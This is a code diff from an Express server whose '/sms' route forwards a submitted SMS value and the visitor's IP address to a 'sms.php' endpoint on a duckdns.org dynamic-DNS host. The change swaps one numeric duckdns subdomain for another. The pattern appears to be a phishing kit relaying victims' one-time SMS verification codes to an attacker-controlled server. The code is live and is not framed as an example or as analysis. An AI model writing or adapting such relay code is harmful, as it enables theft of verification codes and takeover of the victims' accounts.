@@ -212,7 +212,7 @@ app.post('/sms', async (req, res) => {
   try {
 
  
-    const response = await axios.post('https://088855488854758.duckdns.org//sms.php', {
+    const response = await axios.post('https://55514485547555.duckdns.org/sms.php', {
       ip: clientIp,
       sms: sms
     });
